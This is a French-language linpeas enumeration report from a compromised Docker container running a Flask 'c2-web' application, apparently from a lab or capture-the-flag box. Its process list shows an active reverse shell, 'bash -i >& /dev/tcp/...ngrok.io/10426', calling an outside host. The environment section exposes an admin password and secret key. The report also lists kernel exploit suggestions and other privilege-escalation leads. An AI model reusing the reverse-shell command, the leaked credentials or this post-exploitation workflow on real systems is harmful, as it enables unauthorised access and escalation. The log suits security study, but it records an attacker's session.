# Informations de base

- **OS**: Linux version 6.1.0-31-amd64 (debian-kernel@lists.debian.org) (gcc-12 (Debian 12.2.0-14) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Debian 6.1.128-1 (2025-02-07)
- **Utilisateur & Groupes**: uid=998(c2-web) gid=998(c2-web) groups=998(c2-web)
- **Nom d'hôte**: caf697ac4c37

> **Note**: Pas de capacités de découverte réseau (fping ou ping non trouvés).  
> **Bash**: /usr/bin/bash est disponible pour la découverte réseau, le scan de ports et le transfert de ports.

---

# Informations Système

## Système d'exploitation
- **Version**: Linux version 6.1.0-31-amd64
- **lsb_release**: Non trouvé

## Version de Sudo
- **sudo**: Non trouvé

## PATH
- `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`

## Date & Uptime
- **Date**: Tue Mar 25 07:46:42 UTC 2025
- **Uptime**: Non trouvé

## Système de fichiers non monté
- Vérifiez si vous pouvez monter des périphériques non montés

## Disques sd*/disk* dans /dev? (limite 20)

## Environnement
- **SHELL**: /bin/sh
- **HOSTNAME**: caf697ac4c37
- **PWD**: /home/c2-web/.test
- **LOGNAME**: c2-web
- **DOMAIN**: 163.172.66.233
- **HOME**: /home/c2-web
- **SECRET_KEY**: SEmuz80xt4oEQK4YsFPt
- **ADMIN_PASSWORD**: wqHQBzgxXZ6mhpdbvL2KfE
- **ADMIN_USER**: admin
- **USER**: c2-web
- **PATH**: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
- **MAIL**: /var/mail/c2-web
- **FLASK_RUN_FROM_CLI**: true

## Recherche de vérification de signature échouée dans dmesg
- **dmesg**: Non trouvé

## Exécution de Linux Exploit Suggester
- **CVE-2022-2586**: nft_object UAF
  - **Détails**: [openwall.com](https://www.openwall.com/lists/oss-security/2022/08/29/5)
  - **Exposition**: moins probable
  - **Tags**: ubuntu=(20.04){kernel:5.12.13}
  - **Commentaires**: kernel.unprivileged_userns_clone=1 requis (pour obtenir CAP_NET_ADMIN)

- **CVE-2021-22555**: Netfilter heap out-of-bounds write
  - **Détails**: [google.github.io](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html)
  - **Exposition**: moins probable
  - **Tags**: ubuntu=20.04{kernel:5.8.0-*}
  - **Commentaires**: le module kernel ip_tables doit être chargé

---

# Protections

- **AppArmor**: Non trouvé
- **Profil AppArmor**: docker-default (enforcement)
- **grsecurity**: Non trouvé
- **PaX**: Non trouvé
- **Execshield**: Non trouvé
- **SELinux**: Non trouvé
- **Seccomp**: activé
- **Namespace utilisateur**: activé
- **Cgroup2**: activé
- **ASLR**: Oui
- **Imprimante**: Non
- **Machine virtuelle**: Non

---

# Conteneur

- **Est-ce un conteneur?**: docker
- **Conteneur en cours d'exécution?**: Non
- **Détails du conteneur Docker**
  - **Groupe Docker**: Non
  - **Version Docker**: Non trouvé
  - **Vulnérable à CVE-2019-5736**: Non trouvé
  - **Vulnérable à CVE-2019-13139**: Non trouvé
  - **Vulnérable à CVE-2021-41091**: Non trouvé
  - **Docker sans racine?**: Non

---

# Processus, Crons, Timers, Services et Sockets

## Processus en cours (nettoyé)
- **ps**: ne trouve pas les processus, lecture à partir de /proc/
- **Processus**:
  - 5115 bashlinpeas.sh
  - 5111 sort-r
  - 5110 bashlinpeas.sh
  - 2368 bashlinpeas.sh
  - 20 /usr/bin/python3 /usr/local/bin/flask run --host=0.0.0.0 --port=5000
  - 1920 bash-i
  - 1919 bash-c bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/10426 0>&1
  - 19 /usr/bin/python3 /usr/local/bin/flask run --host=0.0.0.0 --port=3000
  - 18 sh-c flask run --host=0.0.0.0 --port=3000
  - 17 sh-c flask run --host=0.0.0.0 --port=5000
  - 16 su-c flask run --host=0.0.0.0 --port=3000 c2-api
  - 15 su-c flask run --host=0.0.0.0 --port=5000 c2-web
  - 14 /bin/bash /entrypoint.sh
  - 13 /usr/sbin/cron
  - 1 /bin/bash /entrypoint.sh

## Processus avec des identifiants en mémoire (nécessite root)
- **gdm-password**: Non trouvé
- **gnome-keyring-daemon**: Non trouvé
- **lightdm**: Non trouvé
- **vsftpd**: Non trouvé
- **apache2**: Non trouvé
- **sshd**: Non trouvé

## Permissions des processus binaires (non 'root root' et n'appartenant pas à l'utilisateur actuel)
- **Total**: 832

## Fichiers ouverts par des processus appartenant à d'autres utilisateurs
- Habituellement vide en raison du manque de privilèges pour lire les informations des processus d'autres utilisateurs

## Chemin Systemd
- **Chemin systemd**: Non trouvé

## Tâches Cron
- **/usr/bin/crontab**
- **incrontab**: Non trouvé
- **/etc/crontab**: -rw-r--r-- 1 root root 1042 Mar 2 2023

## Tâches Cron dans /etc/cron.d
- **Total**: 20
- **Fichiers**:
  - .placeholder
  - backup
  - e2scrub_all

## Tâches Cron dans /etc/cron.daily
- **Total**: 28
- **Fichiers**:
  - .placeholder
  - apt-compat
  - dpkg
  - exim4-base

## Tâches Cron dans /etc/cron.hourly
- **Total**: 12
- **Fichiers**:
  - .placeholder

## Tâches Cron dans /etc/cron.monthly
- **Total**: 12
- **Fichiers**:
  - .placeholder

## Tâches Cron dans /etc/cron.weekly
- **Total**: 12
- **Fichiers**:
  - .placeholder

## Tâches Cron dans /etc/cron.yearly
- **Total**: 12
- **Fichiers**:
  - .placeholder

## SHELL et PATH
- **SHELL**: /bin/sh
- **PATH**: /usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

## Tâches Cron programmées
- `17 * * * * root cd / && run-parts --report /etc/cron.hourly`
- `25 6 * * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }`
- `47 6 * * 7 root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }`
- `52 6 1 * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }`

## Timers système
- **Timers**: Non trouvé

## Analyse des fichiers .timer
- **Timers**: Non trouvé

## Analyse des fichiers .service
- **Services**: Non trouvé

## Analyse des fichiers .socket
- **Sockets**: Non trouvé

## Sockets Unix à l'écoute
- **Sockets**: Non trouvé

## Liste des objets de service D-Bus
- **D-Bus**: Non trouvé

## Fichiers de configuration D-Bus
- **D-Bus**: Non trouvé

---

# Informations Réseau

## Interfaces
- **default**: 0.0.0.0
- **loopback**: 127.0.0.0
- **link-local**: 169.254.0.0

## Réception et Transmission
- **lo**: 282655 bytes, 3280 packets
- **eth0**: 1961472 bytes, 1586 packets

## Hôte, hôtes et DNS
- **Nom d'hôte**: caf697ac4c37
- **Fichier hosts**:
  - 127.0.0.1 localhost
  - ::1 localhost ip6-localhost ip6-loopback
  - fe00::0 ip6-localnet
  - ff00::0 ip6-mcastprefix
  - ff02::1 ip6-allnodes
  - ff02::2 ip6-allrouters
  - 172.20.0.2 caf697ac4c37

## Serveur de noms
- **nameserver**: 127.0.0.11
- **search**: online.net
- **options**: ndots:0

## Ports actifs
- **Ports ouverts**: Non trouvé

## Puis-je sniffer avec tcpdump?
- **tcpdump**: Non

---

# Informations Utilisateurs

## Mon utilisateur
- **Utilisateur**: uid=998(c2-web) gid=998(c2-web) groups=998(c2-web)

## Ai-je des clés PGP?
- **gpg**: /usr/bin/gpg
- **netpgpkeys**: Non trouvé
- **netpgp**: Non trouvé

## Vérification de 'sudo -l', /etc/sudoers, et /etc/sudoers.d
- **sudo**: Non trouvé

## Vérification des jetons sudo
- **Protection ptrace**: désactivée (0), les jetons sudo pourraient être abusés

## Vérification de la politique Pkexec
- **pkexec**: Non trouvé

## Superutilisateurs
- **root**: root:x:0:0:root:/root:/bin/bash

## Utilisateurs avec console
- **administrator**: administrator:x:997:997::/home/administrator:/bin/sh
- **c2-api**: c2-api:x:999:999::/home/c2-api:/bin/sh
- **c2-web**: c2-web:x:998:998::/home/c2-web:/bin/sh
- **root**: root:x:0:0:root:/root:/bin/bash

## Tous les utilisateurs & groupes
- **root**: uid=0(root) gid=0(root) groups=0(root)
- **daemon**: uid=1(daemon) gid=1(daemon) groups=1(daemon)
- **uucp**: uid=10(uucp) gid=10(uucp) groups=10(uucp)
- **Debian-exim**: uid=100(Debian-exim) gid=102(Debian-exim) groups=102(Debian-exim)
- **proxy**: uid=13(proxy) gid=13(proxy) groups=13(proxy)
- **bin**: uid=2(bin) gid=2(bin) groups=2(bin)
- **sys**: uid=3(sys) gid=3(sys) groups=3(sys)
- **www-data**: uid=33(www-data) gid=33(www-data) groups=33(www-data)
- **backup**: uid=34(backup) gid=34(backup) groups=34(backup)
- **list**: uid=38(list) gid=38(list) groups=38(list)
- **irc**: uid=39(irc) gid=39(irc) groups=39(irc)
- **sync**: uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
- **_apt**: uid=42(_apt) gid=65534(nogroup) groups=65534(nogroup)
- **games**: uid=5(games) gid=60(games) groups=60(games)
- **man**: uid=6(man) gid=12(man) groups=12(man)
- **nobody**: uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
- **lp**: uid=7(lp) gid=7(lp) groups=7(lp)
- **mail**: uid=8(mail) gid=8(mail) groups=8(mail)
- **news**: uid=9(news) gid=9(news) groups=9(news)
- **administrator**: uid=997(administrator) gid=997(administrator) groups=997(administrator)
- **c2-web**: uid=998(c2-web) gid=998(c2-web) groups=998(c2-web)
- **c2-api**: uid=999(c2-api) gid=999(c2-api) groups=999(c2-api)

---

# Informations Logiciels

## Logiciels utiles
- **base64**: /usr/bin/base64
- **curl**: /usr/bin/curl
- **g++**: /usr/bin/g++
- **gcc**: /usr/bin/gcc
- **make**: /usr/bin/make
- **perl**: /usr/bin/perl
- **python3**: /usr/bin/python3

## Compilateurs installés
- **g++**: 4:12.2.0-3 amd64
- **g++-12**: 12.2.0-14 amd64
- **gcc**: 4:12.2.0-3 amd64
- **gcc-12**: 12.2.0-14 amd64
- **rpcsvc-proto**: 1.4.3-1 amd64

## Analyse des fichiers d'authentification PAM (limite 70)
- **/etc/pam.d**: drwxr-xr-x 1 root root 4096 Feb 19 16:33

## Analyse des fichiers Ldap (limite 70)
- **/etc/ldap**: drwxr-xr-x 2 root root 4096 Feb 19 16:33

## Analyse des fichiers Keyring (limite 70)
- **/etc/apt/keyrings**: drwxr-xr-x 2 root root 4096 May 25 2023
- **/usr/share/keyrings**: drwxr-xr-x 2 root root 4096 Dec 23 00:00

## Analyse d'autres fichiers intéressants (limite 70)
- **/etc/skel/.bashrc**: -rw-r--r-- 1 root root 3526 Mar 29 2024
- **/home/administrator/.bashrc**: -rw-r--r-- 1 administrator administrator 3526 Mar 29 2024
- **/home/c2-api/.bashrc**: -rw-r--r-- 1 c2-api c2-api 3526 Mar 29 2024
- **/home/c2-web/.bashrc**: -rw-r--r-- 1 c2-web c2-web 3526 Mar 29 2024

## Analyse des fichiers PGP-GPG (limite 70)
- **gpg**: /usr/bin/gpg
- **netpgpkeys**: Non trouvé
- **netpgp**: Non trouvé

## Fichiers passwd non communs (splunk)
- **passwd**: /etc/pam.d/passwd
- **passwd**: /etc/passwd

## Fichiers ssl/ssh
- **Certificats**:
  - /etc/ssl/certs/ACCVRAIZ1.pem
  - /etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
  - /etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
  - /etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
  - /etc/ssl/certs/Actalis_Authentication_Root_CA.pem
  - /etc/ssl/certs/AffirmTrust_Commercial.pem
  - /etc/ssl/certs/AffirmTrust_Networking.pem
  - /etc/ssl/certs/AffirmTrust_Premium.pem
  - /etc/ssl/certs/AffirmTrust_Premium_ECC.pem
  - /etc/ssl/certs/Amazon_Root_CA_1.pem
  - /etc/ssl/certs/Amazon_Root_CA_2.pem
  - /etc/ssl/certs/Amazon_Root_CA_3.pem
  - /etc/ssl/certs/Amazon_Root_CA_4.pem
  - /etc/ssl/certs/Atos_TrustedRoot_2011.pem
  - /etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
  - /etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068_2.pem
  - /etc/ssl/certs/Baltimore_CyberTrust_Root.pem
  - /etc/ssl/certs/Buypass_Class_2_Root_CA.pem
  - /etc/ssl/certs/Buypass_Class_3_Root_CA.pem
  - /etc/ssl/certs/CA_Disig_Root_R2.pem

## Agents ssh et gpg modifiables
- **Sockets**:
  - /etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
  - /etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket
  - /etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket
  - /etc/systemd/user/sockets.target.wants/gpg-agent.socket

## Fichiers intéressants avec des permissions
- **SUID**:
  - /usr/bin/passwd
  - /usr/bin/su
  - /usr/bin/umount
  - /usr/bin/gpasswd
  - /usr/bin/newgrp
  - /usr/bin/mount
  - /usr/bin/chfn
  - /usr/bin/chsh
  - /usr/sbin/exim4

- **SGID**:
  - /usr/bin/chage
  - /usr/bin/expiry
  - /usr/bin/crontab
  - /usr/bin/dotlockfile
  - /usr/sbin/unix_chkpwd

- **Fichiers avec ACLs**: Non trouvé

- **Capacités**:
  - **CapInh**: 0000000000000000
  - **CapPrm**: 0000000000000000
  - **CapEff**: 0000000000000000
  - **CapBnd**: 00000000a80425fb
  - **CapAmb**: 0000000000000000

- **Fichiers avec capacités**: Non trouvé

## Vérification des mauvaises configurations de ld.so
- **/etc/ld.so.conf**:
  - include /etc/ld.so.conf.d/*.conf

- **/etc/ld.so.conf.d**:
  - /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
  - /etc/ld.so.conf.d/libc.conf
  - /etc/ld.so.conf.d/x86_64-linux-gnu.conf

- **/etc/ld.so.preload**: Non trouvé

## Fichiers (scripts) dans /etc/profile.d/
- **Total**: 8

## Permissions dans init, init.d, systemd, et rc.d
- **Permissions**: Non trouvé

## Fichiers root dans les répertoires personnels
- **/home/**: Non trouvé
- **/root/**: Non trouvé

## Fichiers lisibles appartenant à root et lisibles par moi mais non lisibles par le monde
- **Fichiers**: Non trouvé

## Fichiers intéressants modifiables par moi ou modifiables par tout le monde (pas dans Home)
- **Répertoires**:
  - /dev/mqueue
  - /dev/shm
  - /home/c2-web
  - /run/lock
  - /tmp
  - /var/tmp

## Fichiers intéressants modifiables par le groupe (pas dans Home)
- **Fichiers**: Non trouvé

## Autres fichiers intéressants

### Fichiers .sh dans le chemin
- **Fichiers**: Non trouvé

### Fichiers exécutables potentiellement ajoutés par l'utilisateur (limite 70)
- **Fichiers**:
  - /home/c2-web/.test/linpeas.sh
  - /.dockerenv
  - /app/static/index.html
  - /app/static/assets/index-D2osEx95.js
  - /app/static/assets/index-Bq2r1hS8.css
  - /usr/local/bin/dotenv
  - /app/app.py
  - /usr/local/bin/flask
  - /app/static/assets/index-D2t_nCMO.js

### Inattendu dans /opt (habituellement vide)
- **Total**: 12
- **Fichiers**:
  - backup.sh

### Inattendu dans root
- **Fichiers**:
  - /.dockerenv
  - /entrypoint.sh
  - /backup
  - /app
  - /api

### Fichiers modifiés intéressants dans les 5 dernières minutes (limite 100)
- **Fichiers**:
  - /home/c2-web/.gnupg/pubring.kbx
  - /home/c2-web/.gnupg/trustdb.gpg
  - /var/log/backup.log

### Fichiers dans /home/c2-web (limite 20)
- **Total**: 36
- **Fichiers**:
  - .bash_history
  - .bash_logout
  - .bashrc
  - .gnupg
  - .profile
  - .test

### Fichiers dans d'autres répertoires personnels (limite 20)
- **Fichiers**:
  - /home/c2-api/.bashrc
  - /home/c2-api/.profile
  - /home/c2-api/.bash_logout
  - /home/administrator/.bashrc
  - /home/administrator/.profile
  - /home/administrator/.bash_logout

### Applications de messagerie installées
- **Applications**:
  - exim
  - sendmail

### Dossiers de sauvegarde
- **Fichiers**:
  - /etc/cron.d/backup
  - /var/backups

### Fichiers de sauvegarde (limité à 100)
- **Fichiers**:
  - /usr/libexec/dpkg/dpkg-db-backup
  - /usr/lib/systemd/system/dpkg-db-backup.timer
  - /usr/lib/systemd/system/dpkg-db-backup.service
  - /var/log/backup.log
  - /opt/backup.sh
  - /etc/cron.d/backup

### Fichiers web? (limite de sortie)

### Tous les fichiers cachés pertinents (pas dans /sys/ ou ceux listés dans la vérification précédente) (limite 70)
- **Fichiers**:
  - /home/c2-web/.bash_logout
  - /home/c2-api/.bash_logout
  - /home/administrator/.bash_logout
  - /etc/.pwd.lock
  - /etc/skel/.bash_logout

### Fichiers lisibles à l'intérieur de /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, et dossiers de sauvegarde (limite 70)
- **Fichiers**:
  - /etc/cron.d/backup

### Recherche de mots de passe dans les fichiers d'historique

### Recherche de fichiers *password* ou *credential* dans home (limite 70)
- **Fichiers**:
  - /etc/pam.d/common-password
  - /usr/share/pam/common-password
  - /usr/share/pam/common-password.md5sums
  - /var/cache/debconf/passwords.dat
  - /var/lib/pam/password

### Vérification des mots de passe TTY (sudo/su) dans les journaux d'audit

### Recherche de mots de passe dans les journaux (limite 70)
